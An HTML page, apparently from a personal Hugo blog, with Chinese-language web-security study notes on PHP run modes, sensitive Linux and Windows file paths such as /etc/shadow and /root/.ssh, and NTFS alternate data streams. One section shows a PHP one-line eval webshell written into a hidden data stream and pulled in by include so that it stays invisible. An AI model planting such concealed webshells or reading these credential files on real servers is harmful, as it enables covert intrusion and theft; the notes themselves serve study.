@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+   &ndash; Arefu&#39;s Zone
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="PHP 手册-安全 PHP运行模式的深入理解 PHP运行模式有4种： 1）cgi 通用网关接口（Common Gateway Interface)） 2）fast-cgi 常|Hugo-Primer theme&#39;s example site">
+    
+
+    <meta name="apple-mobile-web-app-title" content="Arefu&#39;s Zone">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="Arefu&#39;s Zone">
+    <meta name="twitter:description" content="PHP 手册-安全 PHP运行模式的深入理解 PHP运行模式有4种： 1）cgi 通用网关接口（Common Gateway Interface)） 2）fast-cgi 常|Hugo-Primer theme&#39;s example site">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    Arefu&#39;s Zone
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>公告栏</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/notes/">
+      
+      <span>学习笔记</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1"></div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-01-31. Published at: 0001-01-01.">
+        
+          Lastmod: 2020-01-31
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p><a href="https://www.php.net/manual/zh/index.php">PHP 手册-安全</a></p>
+<p><a href="https://www.cnblogs.com/ivy-zheng/p/10992277.html">PHP运行模式的深入理解</a></p>
+<blockquote>
+<p><strong>PHP运行模式有4种：</strong>
+1）cgi 通用网关接口（Common Gateway Interface)）
+2）fast-cgi 常驻 (long-live) 型的 CGI
+3）cli 命令行运行  （Command Line Interface）
+4）web模块模式 （apache等web服务器运行的模块模式，以mod_php5模块的形式集成）</p>
+<p>HTTPServer这块基本可以看到有三种stack比较流行：</p>
+<p>（1）Apache+mod_php5
+（2）lighttp+spawn-fcgi
+（3）nginx+PHP-FPM</p>
+</blockquote>
+<p><a href="https://www.php.net/manual/en/configuration.changes.php#configuration.changes">php.ini - How to change configuration settings</a></p>
+<p><a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
+<h3 id="敏感目录">敏感目录</h3>
+<h4 id="linux">Linux</h4>
+<pre><code>ssh免密码登录的秘钥文件等
+/root/.ssh/
+</code></pre><h5 id="ubuntu">Ubuntu</h5>
+<blockquote>
+<pre><code>#系统文件
+/etc/passwd
+/etc/shadow
+</code></pre><pre><code>#网页
+/var/www/html
+</code></pre><pre><code>#配置
+/etc/php/7.0/apache2/php.ini    #php
+/etc/php5/apache2/php.ini    #php
+/etc/php.ini    #php
+/etc/apache2/apache2.conf    #apache
+</code></pre><pre><code>#日志
+/var/log/apache2/asccess.log    #apache
+</code></pre></blockquote>
+<h5 id="centos">Centos</h5>
+<blockquote>
+<pre><code>#网页
+/var/httpd/htdocs/index.html
+/usr/share/nginx/html
+</code></pre><pre><code>#日志
+/var/log/nginx/access.log
+/var/log/httpd/access.log
+/etc/httpd/logs/
+</code></pre><pre><code>#配置文件
+/etc/nginx/nginx.conf    #nginx
+/etc/httpd/conf/httpd.conf    #apache2
+/etc/mysql/my.cnf   #mysql
+/etc/php.ini    #php
+</code></pre></blockquote>
+<h5 id="一般源码安装的路径">一般源码安装的路径</h5>
+<p>/usr/local/apache2  #apache2
+/usr/local/php/lib/php.ini    #php</p>
+<h4 id="windows">Windows</h4>
+<blockquote>
+<p>C:\phpStudy\PHPTUtorial\php、apache、www</p>
+</blockquote>
+<p>/proc/self/</p>
+<p><strong>ntfs 文件寄生</strong></p>
+<pre><code>echo test &gt; a1.txt
+  
+echo test2 &gt; a1.txt:js.txt
+  
+  notepad a1.txt:js.txt
+</code></pre><p>宿主文件为a1.txt，a1.txt存在，a1.txt:js.txt则可读取，同时:js.txt隐藏不可见</p>
+<blockquote>
+<p>在NTFS中，一个文件可以有多个$DATA属性。比如我现在想给test.txt加入一个名为ThisIsAnADS的$DATA属性：</p>
+<pre><code>echo Hello, freebuf! &gt; test.txt:ThisIsAnADS
+</code></pre></blockquote>
+<blockquote>
+<pre><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;
+</code></pre><p>用户不能创建一个新的流类型，流类型总是以$符号开始。</p>
+<p>对于 <code>NTFS</code> 格式下的一个文件而言，至少包含一个流，即 <code>data</code> 流(其 <code>stream type</code> 为$DATA), <code>data</code> 流逝文件的主流，默认的 <code>data</code> 流其 <code>stream name</code> 为空， <code>ADS</code> 可以省略 <code>stream name</code> ，但不能省略 <code>stream type</code> 。默认一个文件如果被指派了流，而该流没有 <code>stream type</code> 的话会在存储时自动添加 <code>$DATA</code> ,但在查询结果中需要去除 <code>$DATA</code> ，否则会出现参数错误。</p>
+<p>对于文件夹而言，没有 <code>data</code> 流，其主流逝 <code>directory</code> 流，( <code>stream type</code> 为 <code>$INDEX_ALLOCATION</code> ), <code>directory</code> 流默认的 <code>stream name</code> 是 <code>$130</code> 。尽管文件夹默认没有 <code>data</code> 流，但用户可以指派 <code>data</code> 流。</p>
+</blockquote>
+<p><strong>webshell隐藏</strong></p>
+<blockquote>
+<p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</p>
+<pre><code>echo ^&lt;?php^ @eval(request[cmd])?^&gt; &gt;index.php:hidden.jpg
+</code></pre><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去</p>
+<pre><code>&lt;? include('index.php:hidden.jpg')?&gt;
+</code></pre><p>这样子就可以正常解析我们的一句话了</p>
+</blockquote>
+<p><a href="https://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/">IIS6.0远程命令执行漏洞(CVE-2017-7269)</a></p>
+<p>国内外常用CMS</p>
+<p>ThinkPHP、DedeCMS(织梦CMS)</p>
+<p>常见CMS特征</p>
+<p>joomla</p>
+<p>内网文件传输</p>
+<h4 id="scp-远程文件传输">scp 远程文件传输</h4>
+<div class="highlight"><pre class="chroma"><code class="language-cmd" data-lang="cmd">传送wget的rpm包至简陋的CentOS 6：
+scp F:\Download\wget-1.12-10.el6.x86_64.rpm root@192.168.91.135:~
+</code></pre></div><p>FTP 基于TCP来传输文件，明文传输用户信息和数据。</p>
+<p>SFTP 基于SSH来加密传输文件，可靠性高，可断点续传。</p>
+<p>SCP 是基于SSH来加密拷贝文件，但要知道详细目录，不可断点续传。</p>
+
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b></b><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#敏感目录">敏感目录</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
